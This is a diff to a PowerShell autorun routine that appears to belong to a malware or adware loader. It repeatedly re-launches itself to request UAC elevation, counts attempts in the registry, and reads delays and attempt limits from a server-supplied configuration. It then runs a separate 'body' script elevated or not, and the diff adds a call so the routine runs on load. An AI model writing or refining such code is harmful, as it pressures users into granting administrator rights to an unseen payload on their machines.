@@ -11,10 +11,12 @@ function do_autorun()
         $elevated = IsElevated
         if ($elevated)
         {
+            writedbg "running elevated body path in aggressive admin"
             RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $true
 
             $times = $times + 1
             RegWriteParamInt -keyName "aggressiveAdminTimes" -value $times
+            writedbg "runned elevated: $times"
         } 
         else 
         {
@@ -24,7 +26,6 @@ function do_autorun()
                 if ($times -gt $limit)
                 {
                     writedbg "no more times $times, running non elevated"
-                    Start-Sleep -Seconds 4
                     RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $false
                     return
                 }
@@ -32,30 +33,28 @@ function do_autorun()
 
             $attempt = GetArgInt("attempt")
             $attempt = $attempt + 1
-            $sleep = $server.aggressiveAdminDelay
-            writedbg "Not elevated, sleeping: $sleep"
-            Start-Sleep -Seconds $sleep
+            if ($attempt -ne 1)
+            {
+                $sleep = $server.aggressiveAdminDelay
+                writedbg "Not elevated, sleeping: $sleep"
+                Start-Sleep -Seconds $sleep
+            }
             if ($attempt -gt $server.aggressiveAdminAttempts)
             {
                 writedbg "Not elevated run non-elevating body"
-                Start-Sleep -Seconds 4
                 RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $false    
             }
             else 
             {
                 writedbg "trying to elevate holder"
-                Start-Sleep -Seconds 4
                 try {
-                    RunMe -script (Get-ScriptPath) -repassArgs $true -argName "attempt" -argValue $attempt -uac $true  
+                    RunMe -script (Get-ScriptPath) -repassArgs $false -argName "attempt" -argValue $attempt -uac $true  
                 }
                 catch {
                     RunMe -script (Get-ScriptPath) -repassArgs $true -argName "attempt" -argValue $attempt -uac $false  
-                }
-        
+                }        
             }
-
         }
-
     }
     else 
     {
@@ -69,3 +68,5 @@ function do_autorun()
     }
 
 }
+
+do_autorun
